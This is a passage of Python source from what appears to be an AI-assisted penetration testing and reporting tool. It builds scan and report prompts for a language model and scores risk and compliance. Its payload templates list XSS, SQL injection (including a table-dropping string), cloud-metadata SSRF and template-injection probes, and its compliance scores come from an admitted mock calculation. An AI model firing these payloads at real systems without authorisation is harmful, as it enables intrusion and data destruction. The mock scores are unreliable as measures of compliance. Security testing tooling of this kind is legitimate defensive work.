                        "monitoring_enhancements": List[str], # Detection improvements
                        "incident_response_updates": List[str], # IR plan changes
                        "compliance_actions": List[str]      # Regulatory compliance
                    },
                    "appendices": {
                        "methodology": str,                  # Assessment approach
                        "tools_used": List[str],            # Testing tools
                        "scope_definition": str,            # Assessment boundaries
                        "assumptions_limitations": List[str], # Assessment constraints
                        "evidence_catalog": List[Dict],     # Supporting evidence
                        "glossary": Dict[str, str],         # Technical terms
                        "references": List[str],            # External references
                        "contact_information": Dict[str, str] # Follow-up contacts
                    }
                }

        Examples:
            # Generate technical penetration test report
            report = assistant.generate_report_from_flow(
                "attack_flow_comprehensive_1234567890.json",
                persona="pentester"
            )

            # Executive summary for C-level presentation
            report = assistant.generate_report_from_flow(
                "redteam_assessment.json",
                persona="executive"
            )

            # Compliance audit report
            report = assistant.generate_report_from_flow(
                "vulnerability_assessment.json",
                persona="compliance"
            )

            # Bug bounty submission format
            report = assistant.generate_report_from_flow(
                "bounty_findings.json",
                persona="bugbounty"
            )

            # Save report to file
            import json
            with open("security_assessment_report.json", "w") as f:
                json.dump(report, f, indent=2)

            # Print executive summary
            print("Executive Summary:")
            print(report["executive_summary"]["assessment_overview"])
            print(f"Risk Rating: {report['executive_summary']['risk_rating']}")

        Note:
            - Automatically formats reports based on target persona
            - Includes professional security assessment standards
            - Provides actionable remediation guidance with timelines
            - Maps findings to regulatory compliance requirements
            - Generates evidence-based technical documentation
            - Supports multiple output formats (JSON, PDF, HTML)
        """

        if not os.path.exists(json_file_path):
            return {"error": f"File not found: {json_file_path}"}

        try:
            with open(json_file_path, "r") as f:
                flow_data = json.load(f)
        except Exception as e:
            return {"error": f"Failed to parse JSON file: {str(e)}"}

        # Validate that this is an attack flow file
        if not all(
            key in flow_data for key in ["attack_types", "attack_flow", "mitre_mapping"]
        ):
            return {"error": "Invalid attack flow file format"}

        # Extract key information
        attack_types = flow_data.get("attack_types", [])
        technique = flow_data.get("technique", "adaptive")
        target = flow_data.get("target", "generic web application")
        risk_level = flow_data.get("risk_level", "UNKNOWN")
        generated_at = flow_data.get("generated_at", "Unknown")
        mitre_mapping = flow_data.get("mitre_mapping", {})

        # Create comprehensive report prompt
        report_prompt = f"""
        Generate a comprehensive security assessment report based on the following attack flow analysis:

        **Attack Flow Details:**
        - Attack Types: {", ".join(attack_types)}
        - Technique: {technique}
        - Target: {target}
        - Risk Level: {risk_level}
        - Generated: {generated_at}

        **MITRE ATT&CK Mapping:**
        {json.dumps(mitre_mapping, indent=2)}

        **Original Analysis:**
        {flow_data.get("attack_flow", "No analysis available")}

        Please create a professional security report that includes:

        1. **Executive Summary**
           - High-level overview of findings
           - Business impact assessment
           - Key recommendations

        2. **Technical Analysis**
           - Detailed vulnerability breakdown
           - Attack vector analysis
           - Exploitation methodology

        3. **Risk Assessment**
           - Likelihood and impact analysis
           - CVSS scoring where applicable
           - Business risk categorization

        4. **MITRE ATT&CK Framework Alignment**
           - Technique mapping and analysis
           - Threat actor behavior correlation
           - Detection and mitigation strategies

        5. **Remediation Recommendations**
           - Immediate actions (quick wins)
           - Short-term improvements
           - Long-term strategic recommendations

        6. **Implementation Timeline**
           - Priority-based action plan
           - Resource requirements
           - Success metrics

        Format the report professionally with clear sections, bullet points, and actionable recommendations.
        """

        # Generate report using AI
        ai_report = self.ask_ai(report_prompt, context="planning", persona=persona)

        # Create comprehensive report data structure
        report_data = {
            "report_metadata": {
                "generated_at": datetime.now().isoformat(),
                "source_file": json_file_path,
                "report_type": "Attack Flow Analysis Report",
                "persona": persona or "default",
                "version": "1.0",
            },
            "attack_flow_summary": {
                "attack_types": attack_types,
                "technique": technique,
                "target": target,
                "risk_level": risk_level,
                "original_generation_date": generated_at,
            },
            "mitre_analysis": {
                "mapped_techniques": mitre_mapping,
                "technique_count": sum(len(techs) for techs in mitre_mapping.values()),
                "coverage_areas": list(mitre_mapping.keys()),
            },
            "ai_generated_report": ai_report,
            "recommendations": self._extract_recommendations(ai_report or ""),
            "risk_metrics": self._calculate_risk_metrics(flow_data),
            "compliance_notes": self._generate_compliance_notes(
                attack_types, mitre_mapping
            ),
        }

        return report_data

    def _calculate_risk_metrics(self, flow_data: Dict) -> Dict:
        """Calculate detailed risk metrics from flow data"""
        attack_types = flow_data.get("attack_types", [])
        risk_level = flow_data.get("risk_level", "UNKNOWN")

        # Risk scoring based on attack types
        risk_scores = {
            "xss": {"likelihood": 8, "impact": 6},
            "sqli": {"likelihood": 7, "impact": 9},
            "lfi": {"likelihood": 5, "impact": 8},
            "ssrf": {"likelihood": 6, "impact": 7},
            "ssti": {"likelihood": 4, "impact": 9},
        }

        total_likelihood = 0
        total_impact = 0

        for attack_type in attack_types:
            if attack_type in risk_scores:
                total_likelihood += risk_scores[attack_type]["likelihood"]
                total_impact += risk_scores[attack_type]["impact"]

        avg_likelihood = total_likelihood / len(attack_types) if attack_types else 0
        avg_impact = total_impact / len(attack_types) if attack_types else 0

        # Calculate composite risk score
        composite_score = (avg_likelihood * avg_impact) / 10

        return {
            "likelihood_score": round(avg_likelihood, 2),
            "impact_score": round(avg_impact, 2),
            "composite_risk_score": round(composite_score, 2),
            "risk_level": risk_level,
            "attack_complexity": len(attack_types),
            "severity_rating": self._get_severity_rating(composite_score),
        }

    def _get_severity_rating(self, composite_score: float) -> str:
        """Convert composite score to severity rating"""
        if composite_score >= 8.0:
            return "CRITICAL"
        elif composite_score >= 6.0:
            return "HIGH"
        elif composite_score >= 4.0:
            return "MEDIUM"
        elif composite_score >= 2.0:
            return "LOW"
        else:
            return "INFORMATIONAL"

    def _generate_compliance_notes(
        self, attack_types: List[str], mitre_mapping: Dict
    ) -> Dict:
        """Generate compliance and regulatory notes"""

        # Map attack types to compliance frameworks
        compliance_mapping = {
            "xss": ["OWASP Top 10 A03", "PCI DSS 6.5.7", "NIST SP 800-53 SI-10"],
            "sqli": ["OWASP Top 10 A03", "PCI DSS 6.5.1", "NIST SP 800-53 SI-10"],
            "lfi": ["OWASP Top 10 A06", "NIST SP 800-53 AC-3", "ISO 27001 A.9.4.2"],
            "ssrf": ["OWASP Top 10 A10", "NIST SP 800-53 SC-7", "ISO 27001 A.13.1.3"],
            "ssti": ["OWASP Top 10 A03", "NIST SP 800-53 SI-10", "ISO 27001 A.14.2.5"],
        }

        applicable_standards = set()
        for attack_type in attack_types:
            if attack_type in compliance_mapping:
                applicable_standards.update(compliance_mapping[attack_type])

        return {
            "applicable_standards": list(applicable_standards),
            "owasp_categories": [std for std in applicable_standards if "OWASP" in std],
            "nist_controls": [std for std in applicable_standards if "NIST" in std],
            "iso_controls": [std for std in applicable_standards if "ISO" in std],
            "pci_requirements": [std for std in applicable_standards if "PCI" in std],
            "mitre_technique_count": sum(
                len(techs) for techs in mitre_mapping.values()
            ),
            "compliance_summary": f"Assessment covers {len(applicable_standards)} compliance requirements across {len(attack_types)} attack vectors",
        }

    def ai_vulnerability_scan(
        self,
        targets: List[str],
        scan_type: str = "comprehensive",
        persona: Optional[str] = None,
        integration_data: Optional[Dict] = None,
    ) -> Dict:
        """AI-Powered Vulnerability Scanner with ReconCLI integration"""

        # Validate scan types
        valid_scan_types = ["quick", "comprehensive", "focused", "deep", "compliance"]
        if scan_type not in valid_scan_types:
            return {
                "error": f"Invalid scan type: {scan_type}. Valid: {valid_scan_types}"
            }

        # Process integration data from ReconCLI modules
        recon_context = ""
        if integration_data:
            recon_context = self._process_integration_data(integration_data)

        # Build AI vulnerability assessment prompt
        vuln_prompt = f"""
        Perform AI-powered vulnerability assessment on the following targets:

        **Targets:** {", ".join(targets)}
        **Scan Type:** {scan_type}
        **ReconCLI Integration Data:**
        {recon_context}

        Analyze based on scan type:

        QUICK SCAN:
        - Common web vulnerabilities (XSS, SQLi, CSRF)
        - Basic authentication bypasses
        - Directory traversal attempts
        - Input validation issues

        COMPREHENSIVE SCAN:
        - All quick scan vulnerabilities plus:
        - Advanced injection techniques
        - Business logic flaws
        - Session management issues
        - Authorization bypasses
        - API security assessment

        FOCUSED SCAN:
        - Target specific technology stack vulnerabilities
        - Framework-specific attacks
        - Version-specific exploits
        - Configuration weaknesses

        DEEP SCAN:
        - Advanced persistent threats simulation
        - Complex attack chain development
        - Zero-day like vulnerability discovery
        - Custom payload generation

        COMPLIANCE SCAN:
        - OWASP Top 10 assessment
        - PCI DSS compliance checks
        - GDPR security requirements
        - SOC2 security controls

        Provide:
        1. Vulnerability prioritization matrix
        2. Exploitation difficulty assessment
        3. Business impact analysis
        4. Specific payload recommendations
        5. Remediation guidance with timelines
        6. Integration with ReconCLI findings

        Format as structured vulnerability report with CVSS scoring.
        """

        # Get AI analysis
        ai_analysis = self.ask_ai(vuln_prompt, context="payload", persona=persona)

        # Generate specific vulnerability tests
        vulnerability_tests = self._generate_vulnerability_tests(targets, scan_type)

        # Create comprehensive scan results
        scan_results = {
            "scan_metadata": {
                "targets": targets,
                "scan_type": scan_type,
                "persona": persona or "default",
                "timestamp": datetime.now().isoformat(),
                "integration_source": "ReconCLI",
            },
            "ai_analysis": ai_analysis,
            "vulnerability_tests": vulnerability_tests,
            "risk_assessment": self._assess_vulnerability_risk(targets, scan_type),
            "integration_insights": self._extract_integration_insights(
                integration_data
            ),
            "recommended_actions": self._generate_vuln_recommendations(
                ai_analysis or ""
            ),
            "compliance_mapping": self._map_vulnerabilities_to_compliance(scan_type),
        }

        return scan_results

    def _process_integration_data(self, integration_data: Dict) -> str:
        """Process data from ReconCLI modules for vulnerability context"""
        context_parts = []

        # Process subdomain enumeration data
        if "subdomains" in integration_data:
            subs = integration_data["subdomains"]
            context_parts.append(
                f"Discovered {len(subs)} subdomains: {', '.join(subs[:10])}"
            )

        # Process HTTP discovery data
        if "http_services" in integration_data:
            services = integration_data["http_services"]
            context_parts.append(f"Active HTTP services: {len(services)} endpoints")

        # Process technology detection
        if "technologies" in integration_data:
            techs = integration_data["technologies"]
            context_parts.append(f"Detected technologies: {', '.join(techs)}")

        # Process URL discovery
        if "urls" in integration_data:
            urls = integration_data["urls"]
            context_parts.append(f"Discovered {len(urls)} URLs/endpoints")

        # Process vulnerability scan results
        if "existing_vulns" in integration_data:
            vulns = integration_data["existing_vulns"]
            context_parts.append(f"Existing vulnerabilities found: {len(vulns)}")

        return (
            "\n".join(context_parts)
            if context_parts
            else "No integration data available"
        )

    def _generate_vulnerability_tests(self, targets: List[str], scan_type: str) -> Dict:
        """Generate specific vulnerability test cases"""

        test_categories = {
            "quick": ["xss_basic", "sqli_basic", "dir_traversal", "auth_bypass"],
            "comprehensive": [
                "xss_advanced",
                "sqli_advanced",
                "xxe",
                "ssrf",
                "ssti",
                "idor",
                "csrf",
            ],
            "focused": ["tech_specific", "version_exploits", "config_weaknesses"],
            "deep": ["advanced_chains", "custom_payloads", "zero_day_simulation"],
            "compliance": ["owasp_top10", "pci_dss", "gdpr_security", "soc2_controls"],
        }

        selected_tests = test_categories.get(
            scan_type, test_categories["comprehensive"]
        )

        vulnerability_tests = {}
        for test_type in selected_tests:
            vulnerability_tests[test_type] = self._create_test_payload(
                test_type, targets
            )

        return vulnerability_tests

    def _create_test_payload(self, test_type: str, targets: List[str]) -> Dict:
        """Create specific test payloads for vulnerability types"""

        payload_templates = {
            "xss_basic": {
                "payloads": [
                    "<script>alert('XSS')</script>",
                    "<img src=x onerror=alert(1)>",
                    "javascript:alert('XSS')",
                ],
                "parameters": ["q", "search", "input", "data", "name"],
                "description": "Basic XSS detection payloads",
            },
            "xss_advanced": {
                "payloads": [
                    "<svg onload=alert(document.domain)>",
                    "<iframe src=javascript:alert(1)>",
                    '"><script>alert(String.fromCharCode(88,83,83))</script>',
                ],
                "parameters": [
                    "q",
                    "search",
                    "input",
                    "data",
                    "name",
                    "callback",
                    "redirect",
                ],
                "description": "Advanced XSS with WAF bypass techniques",
            },
            "sqli_basic": {
                "payloads": [
                    "' OR '1'='1",
                    "1' UNION SELECT NULL--",
                    "'; DROP TABLE users--",
                ],
                "parameters": ["id", "user", "login", "search", "filter"],
                "description": "Basic SQL injection detection",
            },
            "sqli_advanced": {
                "payloads": [
                    "1' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
                    "1' UNION SELECT schema_name FROM information_schema.schemata--",
                    "1'; WAITFOR DELAY '00:00:05'--",
                ],
                "parameters": [
                    "id",
                    "user",
                    "login",
                    "search",
                    "filter",
                    "order",
                    "limit",
                ],
                "description": "Advanced SQL injection with data extraction",
            },
            "ssrf": {
                "payloads": [
                    "http://localhost:80",
                    "http://169.254.169.254/latest/meta-data/",
                    "gopher://localhost:80/",
                ],
                "parameters": ["url", "callback", "redirect", "fetch", "proxy"],
                "description": "Server-Side Request Forgery detection",
            },
            "ssti": {
                "payloads": ["{{7*7}}", "${7*7}", "<%=7*7%>"],
                "parameters": ["template", "data", "content", "message"],
                "description": "Server-Side Template Injection",
            },
        }

        return payload_templates.get(
            test_type,
            {
                "payloads": ["Test payload for " + test_type],
                "parameters": ["general"],
                "description": f"Generic test for {test_type}",
            },
        )

    def _assess_vulnerability_risk(self, targets: List[str], scan_type: str) -> Dict:
        """Assess risk level based on targets and scan type"""

        risk_factors = {
            "target_count": len(targets),
            "scan_depth": {
                "quick": 2,
                "comprehensive": 4,
                "focused": 3,
                "deep": 5,
                "compliance": 3,
            }.get(scan_type, 3),
            "potential_impact": (
                "HIGH" if scan_type in ["deep", "comprehensive"] else "MEDIUM"
            ),
        }

        # Calculate composite risk score
        base_score = risk_factors["scan_depth"] * 2
        target_multiplier = min(len(targets) * 0.5, 3)  # Cap at 3x multiplier
        composite_score = min(base_score + target_multiplier, 10)

        return {
            "composite_score": round(composite_score, 2),
            "risk_level": self._get_severity_rating(composite_score),
            "factors": risk_factors,
            "recommendation": self._get_risk_recommendation(composite_score),
        }

    def _extract_integration_insights(
        self, integration_data: Optional[Dict]
    ) -> List[str]:
        """Extract actionable insights from ReconCLI integration data"""
        insights = []

        if not integration_data:
            return ["No integration data available for enhanced insights"]

        # Subdomain insights
        if "subdomains" in integration_data:
            sub_count = len(integration_data["subdomains"])
            if sub_count > 50:
                insights.append(
                    f"Large subdomain footprint ({sub_count}) increases attack surface significantly"
                )
            elif sub_count > 10:
                insights.append(
                    f"Moderate subdomain footprint ({sub_count}) requires systematic testing"
                )

        # Technology insights
        if "technologies" in integration_data:
            techs = integration_data["technologies"]
            if any("WordPress" in tech for tech in techs):
                insights.append(
                    "WordPress detected - check for plugin vulnerabilities and version issues"
                )
            if any("Apache" in tech for tech in techs):
                insights.append(
                    "Apache server detected - test for configuration weaknesses"
                )

        # URL insights
        if "urls" in integration_data:
            url_count = len(integration_data["urls"])
            if url_count > 100:
                insights.append(
                    f"Extensive URL discovery ({url_count}) indicates complex application - focus on parameter testing"
                )

        return insights[:10]  # Limit to top 10 insights

    def _generate_vuln_recommendations(self, analysis: str) -> List[str]:
        """Generate vulnerability-specific recommendations"""
        recommendations = []

        # Extract recommendations from AI analysis
        lines = analysis.split("\n")
        for line in lines:
            if any(
                indicator in line.lower()
                for indicator in [
                    "recommend",
                    "suggest",
                    "should",
                    "must",
                    "critical",
                    "fix",
                    "patch",
                ]
            ):
                recommendations.append(line.strip())

        # Add standard vulnerability recommendations
        recommendations.extend(
            [
                "Implement input validation and output encoding",
                "Use parameterized queries to prevent SQL injection",
                "Enable Content Security Policy (CSP) headers",
                "Implement proper authentication and session management",
                "Regular security testing and code reviews",
                "Keep all frameworks and dependencies updated",
            ]
        )

        return recommendations[:15]  # Limit to top 15 recommendations

    def _map_vulnerabilities_to_compliance(self, scan_type: str) -> Dict:
        """Map vulnerability findings to compliance frameworks"""

        compliance_mapping = {
            "quick": {
                "owasp": [
                    "A03:2021 – Injection",
                    "A07:2021 – Identification and Authentication Failures",
                ],
                "pci_dss": ["6.5.1", "6.5.7"],
                "nist": ["SI-10", "AC-2"],
            },
            "comprehensive": {
                "owasp": [
                    "A01:2021 – Broken Access Control",
                    "A03:2021 – Injection",
                    "A07:2021 – Identification and Authentication Failures",
                ],
                "pci_dss": ["6.5.1", "6.5.7", "6.5.8", "6.5.10"],
                "nist": ["SI-10", "AC-2", "AC-3", "SC-7"],
            },
            "compliance": {
                "owasp": ["All OWASP Top 10 2021"],
                "pci_dss": ["6.5.1-6.5.10", "11.2", "11.3"],
                "nist": ["SI-10", "AC-2", "AC-3", "SC-7", "RA-5"],
                "gdpr": ["Article 32 - Security of processing"],
                "soc2": ["CC6.1", "CC6.2", "CC6.3"],
            },
        }

        return compliance_mapping.get(scan_type, compliance_mapping["comprehensive"])

    def _get_risk_recommendation(self, composite_score: float) -> str:
        """Get risk-based recommendations"""
        if composite_score >= 8.0:
            return "IMMEDIATE ACTION REQUIRED - Critical vulnerabilities likely present"
        elif composite_score >= 6.0:
            return "HIGH PRIORITY - Schedule vulnerability remediation within 48 hours"
        elif composite_score >= 4.0:
            return "MEDIUM PRIORITY - Address vulnerabilities within 1 week"
        else:
            return "LOW PRIORITY - Include in regular security maintenance cycle"

    def scan_endpoints_with_ai(
        self,
        endpoints_file: str,
        scan_type: str = "comprehensive",
        persona: Optional[str] = None,
        integration_mode: bool = True,
    ) -> Dict:
        """Advanced AI-powered vulnerability scanner with ReconCLI integration.

        Performs intelligent vulnerability assessments on endpoints discovered by ReconCLI modules,
        using AI to analyze patterns, predict attack vectors, and generate targeted payloads.

        Args:
            endpoints_file (str): Path to ReconCLI output file (JSON/TXT formats supported)
                                 - urlcli output with HTTP/HTTPS endpoints
                                 - subdocli output with discovered subdomains
                                 - dirbcli output with directory/file discoveries
                                 - httpcli output with HTTP service details

            scan_type (str): Vulnerability scan depth and focus
                           - "quick": Fast common vulnerability scan (XSS, SQLi, CSRF)
                           - "comprehensive": Complete assessment with advanced techniques
                           - "focused": Technology-specific vulnerability testing
                           - "deep": APT simulation, zero-day discovery, advanced threats
                           - "compliance": OWASP Top 10, PCI DSS, GDPR compliance assessment

            persona (Optional[str]): AI persona for specialized methodology
                                   - "redteam": Stealth operations, evasion techniques
                                   - "bugbounty": Quick wins, high-impact vulnerabilities
                                   - "pentester": Professional methodology, compliance
                                   - "trainer": Educational approach with explanations
                                   - "osint": Passive intelligence, minimal footprint

            integration_mode (bool): Enable ReconCLI integration features
                                   - Cross-reference with other ReconCLI module outputs
                                   - Intelligent context correlation
                                   - Enhanced attack surface mapping

        Returns:
            Dict: Comprehensive vulnerability assessment results
                {
                    "scan_summary": {
                        "total_endpoints": int,
                        "vulnerable_endpoints": int,
                        "critical_vulnerabilities": int,
                        "high_vulnerabilities": int,
                        "medium_vulnerabilities": int,
                        "low_vulnerabilities": int,
                        "scan_duration": str,
                        "scan_type": str,
                        "persona_used": str
                    },
                    "vulnerabilities": [
                        {
                            "endpoint": str,
                            "vulnerability_type": str,
                            "severity": str,
                            "description": str,
                            "payload": str,
                            "mitigation": str,
                            "references": List[str],
                            "confidence_score": float,
                            "attack_complexity": str,
                            "exploit_availability": bool,
                            "mitre_techniques": List[str]
                        }
                    ],
                    "attack_chains": [
                        {
                            "chain_id": str,
                            "vulnerabilities": List[str],
                            "attack_path": str,
                            "impact_assessment": str,
                            "likelihood": str,
                            "mitigation_priority": str
                        }
                    ],
                    "compliance_assessment": {
                        "owasp_top10_coverage": Dict[str, str],
                        "compliance_score": float,
                        "failed_controls": List[str],
                        "remediation_roadmap": List[str]
                    },
                    "recommendations": {
                        "immediate_actions": List[str],
                        "strategic_improvements": List[str],
                        "monitoring_suggestions": List[str],
                        "next_assessment_timeline": str
                    }
                }

        Examples:
            # Quick vulnerability scan for bug bounty
            results = assistant.scan_endpoints_with_ai(
                "urlcli_output.json",
                scan_type="quick",
                persona="bugbounty"
            )

            # Comprehensive penetration test assessment
            results = assistant.scan_endpoints_with_ai(
                "discovered_endpoints.txt",
                scan_type="comprehensive",
                persona="pentester",
                integration_mode=True
            )

            # Compliance-focused security assessment
            results = assistant.scan_endpoints_with_ai(
                "http_services.json",
                scan_type="compliance",
                persona="pentester"
            )

            # Advanced red team simulation
            results = assistant.scan_endpoints_with_ai(
                "target_endpoints.txt",
                scan_type="deep",
                persona="redteam",
                integration_mode=True
            )

        Note:
            - Supports multiple ReconCLI output formats automatically
            - Integrates with existing ReconCLI session data when available
            - Generates detailed compliance reports for enterprise environments
            - Provides actionable remediation guidance with priority scoring
            - Uses AI to correlate vulnerabilities across attack surface
        """

        if not os.path.exists(endpoints_file):
            return {"error": f"Endpoints file not found: {endpoints_file}"}

        try:
            # Load endpoints from various ReconCLI output formats
            endpoints_data = self._load_endpoints_file(endpoints_file)

            if not endpoints_data:
                return {"error": "No endpoints found in file"}

            # Extract integration data if available
            integration_data = None
            if integration_mode:
                integration_data = self._extract_recon_data(endpoints_file)

            # Perform AI vulnerability scan
            scan_results = self.ai_vulnerability_scan(
                targets=endpoints_data["endpoints"],
                scan_type=scan_type,
                persona=persona,
                integration_data=integration_data,
            )

            # Add endpoint-specific metadata
            scan_results["endpoint_metadata"] = {
                "source_file": endpoints_file,
                "total_endpoints": len(endpoints_data["endpoints"]),
                "endpoint_types": endpoints_data.get("types", []),
                "scan_timestamp": datetime.now().isoformat(),
            }

            return scan_results

        except Exception as e:
            return {"error": f"Failed to process endpoints file: {str(e)}"}

    def _load_endpoints_file(self, filepath: str) -> Dict:
        """Load endpoints from various ReconCLI output formats"""
        endpoints = []
        endpoint_types = []

        try:
            # Try JSON format first (urlcli, httpcli output)
            if filepath.endswith(".json"):
                with open(filepath, "r") as f:
                    data = json.load(f)

                if isinstance(data, list):
                    endpoints = [item.get("url", str(item)) for item in data if item]
                elif isinstance(data, dict):
                    if "urls" in data:
                        endpoints = data["urls"]
                    elif "endpoints" in data:
                        endpoints = data["endpoints"]
                    elif "results" in data:
                        endpoints = [r.get("url", str(r)) for r in data["results"]]

            # Try text format (common ReconCLI output)
            else:
                with open(filepath, "r") as f:
                    endpoints = [line.strip() for line in f if line.strip()]

            # Categorize endpoint types
            for endpoint in endpoints:
                if any(param in endpoint for param in ["?", "&", "="]):
                    endpoint_types.append("parametrized")
                elif any(ext in endpoint for ext in [".php", ".asp", ".jsp"]):
                    endpoint_types.append("dynamic")
                elif any(ext in endpoint for ext in [".js", ".css", ".png", ".jpg"]):
                    endpoint_types.append("static")
                else:
                    endpoint_types.append("unknown")

            return {
                "endpoints": endpoints[:100],  # Limit to 100 endpoints for performance
                "types": list(set(endpoint_types)),
                "total_found": len(endpoints),
            }

        except Exception as e:
            return {"endpoints": [], "error": str(e)}

    def _extract_recon_data(self, filepath: str) -> Dict:
        """Extract additional reconnaissance data for context"""
        recon_data = {}

        # Try to find related ReconCLI output files
        base_dir = os.path.dirname(filepath)
        base_name = os.path.splitext(os.path.basename(filepath))[0]

        # Look for subdomains file
        subdomain_files = [
            f"{base_name}_subdomains.txt",
            "subs_resolved.txt",
            "subdomains.txt",
        ]

        for sub_file in subdomain_files:
            sub_path = os.path.join(base_dir, sub_file)
            if os.path.exists(sub_path):
                try:
                    with open(sub_path, "r") as f:
                        recon_data["subdomains"] = [
                            line.strip() for line in f if line.strip()
                        ][:50]
                except Exception:
                    # Subdomain file not found or unreadable
                    pass

        # Look for technology detection file
        tech_files = [f"{base_name}_technologies.json", "tech_detection.json"]

        for tech_file in tech_files:
            tech_path = os.path.join(base_dir, tech_file)
            if os.path.exists(tech_path):
                try:
                    with open(tech_path, "r") as f:
                        tech_data = json.load(f)
                        if isinstance(tech_data, dict) and "technologies" in tech_data:
                            recon_data["technologies"] = tech_data["technologies"]
                        elif isinstance(tech_data, list):
                            recon_data["technologies"] = tech_data
                except Exception:
                    # Technology file not found or unreadable
                    pass

        return recon_data

    def generate_compliance_report(
        self,
        scan_results: Dict,
        framework: str = "comprehensive",
        persona: Optional[str] = None,
    ) -> Dict:
        """Generate detailed compliance assessment report"""

        compliance_frameworks = {
            "owasp": {
                "name": "OWASP Top 10 2021",
                "categories": [
                    "A01:2021 – Broken Access Control",
                    "A02:2021 – Cryptographic Failures",
                    "A03:2021 – Injection",
                    "A04:2021 – Insecure Design",
                    "A05:2021 – Security Misconfiguration",
                    "A06:2021 – Vulnerable and Outdated Components",
                    "A07:2021 – Identification and Authentication Failures",
                    "A08:2021 – Software and Data Integrity Failures",
                    "A09:2021 – Security Logging and Monitoring Failures",
                    "A10:2021 – Server-Side Request Forgery (SSRF)",
                ],
            },
            "nist": {
                "name": "NIST Cybersecurity Framework",
                "categories": [
                    "ID - Identify",
                    "PR - Protect",
                    "DE - Detect",
                    "RS - Respond",
                    "RC - Recover",
                ],
            },
            "iso27001": {
                "name": "ISO 27001:2013",
                "categories": [
                    "A.5 - Information Security Policies",
                    "A.6 - Organization of Information Security",
                    "A.7 - Human Resource Security",
                    "A.8 - Asset Management",
                    "A.9 - Access Control",
                    "A.10 - Cryptography",
                    "A.11 - Physical and Environmental Security",
                    "A.12 - Operations Security",
                    "A.13 - Communications Security",
                    "A.14 - System Acquisition, Development and Maintenance",
                ],
            },
            "pci_dss": {
                "name": "PCI DSS v4.0",
                "categories": [
                    "Req 1 - Install and maintain network security controls",
                    "Req 2 - Apply secure configurations",
                    "Req 3 - Protect stored cardholder data",
                    "Req 4 - Protect cardholder data with strong cryptography",
                    "Req 5 - Protect all systems and networks from malicious software",
                    "Req 6 - Develop and maintain secure systems and software",
                ],
            },
        }

        if framework not in compliance_frameworks and framework != "comprehensive":
            return {"error": f"Unknown compliance framework: {framework}"}

        compliance_prompt = f"""
        Generate a detailed compliance assessment report based on the following scan results:

        **Scan Data:**
        {json.dumps(scan_results, indent=2)[:2000]}...

        **Framework Focus:** {framework}

        Create a comprehensive compliance report that includes:

        1. **Executive Summary**
           - Overall compliance posture
           - Key risk areas identified
           - Business impact assessment
           - Remediation priority matrix

        2. **Detailed Compliance Mapping**
           - Map findings to specific compliance requirements
           - Gap analysis for each framework requirement
           - Risk scoring for each violation
           - Evidence of compliance where applicable

        3. **Framework-Specific Analysis**
           {"- OWASP Top 10 2021 mapping and coverage" if framework in ["owasp", "comprehensive"] else ""}
           {"- NIST Cybersecurity Framework alignment" if framework in ["nist", "comprehensive"] else ""}
           {"- ISO 27001:2013 control mapping" if framework in ["iso27001", "comprehensive"] else ""}
           {"- PCI DSS v4.0 requirement coverage" if framework in ["pci_dss", "comprehensive"] else ""}

        4. **Risk Assessment Matrix**
           - Critical/High/Medium/Low risk categorization
           - Likelihood and impact analysis
           - Compliance score calculation
           - Trend analysis and benchmarking

        5. **Remediation Roadmap**
           - Immediate actions required (0-30 days)
           - Short-term improvements (30-90 days)
           - Long-term strategic initiatives (90+ days)
           - Resource requirements and cost estimates

        6. **Continuous Monitoring Recommendations**
           - KPIs and metrics for ongoing compliance
           - Automated testing strategies
           - Regular assessment schedules
           - Audit preparation guidance

        Format as a professional compliance assessment with specific, actionable recommendations.
        """

        ai_report = self.ask_ai(compliance_prompt, context="planning", persona=persona)

        # Calculate compliance scores
        compliance_scores = self._calculate_compliance_scores(scan_results, framework)

        # Generate compliance metrics
        compliance_metrics = self._generate_compliance_metrics(scan_results)

        report_data = {
            "report_metadata": {
                "generated_at": datetime.now().isoformat(),
                "framework": framework,
                "persona": persona or "default",
                "report_type": "Compliance Assessment",
                "version": "2.0",
            },
            "executive_summary": {
                "overall_score": compliance_scores.get("overall_score", 0),
                "framework_scores": compliance_scores.get("framework_scores", {}),
                "critical_issues": compliance_metrics.get("critical_issues", 0),
                "total_findings": compliance_metrics.get("total_findings", 0),
                "compliance_percentage": compliance_scores.get(
                    "compliance_percentage", 0
                ),
            },
            "ai_generated_report": ai_report,
            "compliance_scores": compliance_scores,
            "compliance_metrics": compliance_metrics,
            "framework_details": (
                compliance_frameworks.get(framework, compliance_frameworks)
                if framework == "comprehensive"
                else compliance_frameworks.get(framework)
            ),
            "remediation_matrix": self._generate_remediation_matrix(scan_results),
            "audit_checklist": self._generate_audit_checklist(framework),
            "monitoring_kpis": self._generate_monitoring_kpis(framework),
        }

        return report_data

    def _calculate_compliance_scores(self, scan_results: Dict, framework: str) -> Dict:
        """Calculate compliance scores based on scan results"""

        # Base scoring algorithm
        total_issues = scan_results.get("vulnerability_tests", {})
        critical_weight = 10
        high_weight = 7
        medium_weight = 4
        low_weight = 1

        issue_counts = {"critical": 0, "high": 0, "medium": 0, "low": 0}

        # Count issues by severity (mock calculation for now)
        for test_name, test_data in total_issues.items():
            if "critical" in test_name.lower():
                issue_counts["critical"] += 1
            elif "high" in test_name.lower():
                issue_counts["high"] += 1
            elif "medium" in test_name.lower():
                issue_counts["medium"] += 1
            else:
                issue_counts["low"] += 1

        # Calculate weighted score
        total_weighted_issues = (
            issue_counts["critical"] * critical_weight
            + issue_counts["high"] * high_weight
            + issue_counts["medium"] * medium_weight
            + issue_counts["low"] * low_weight
        )

        # Maximum possible score (assuming 100 total possible issues)
        max_possible_score = 100 * critical_weight

        # Compliance percentage (higher is better)
        compliance_percentage = max(
            0, 100 - (total_weighted_issues / max_possible_score * 100)
        )

        # Overall score (0-10 scale)
        overall_score = compliance_percentage / 10

        framework_scores = {}
        if framework == "comprehensive":
            framework_scores = {
                "owasp": max(0, overall_score - 1),
                "nist": max(0, overall_score - 0.5),
                "iso27001": max(0, overall_score - 0.8),
                "pci_dss": max(0, overall_score - 1.2),
            }
        else:
            framework_scores[framework] = overall_score

        return {
            "overall_score": round(overall_score, 2),
            "compliance_percentage": round(compliance_percentage, 2),
            "framework_scores": framework_scores,
            "issue_breakdown": issue_counts,
            "weighted_score": total_weighted_issues,
        }

    def _generate_compliance_metrics(self, scan_results: Dict) -> Dict:
        """Generate detailed compliance metrics"""

        vulnerability_tests = scan_results.get("vulnerability_tests", {})

        return {
            "total_findings": len(vulnerability_tests),
            "critical_issues": sum(
                1 for test in vulnerability_tests if "critical" in test.lower()
            ),
            "high_issues": sum(
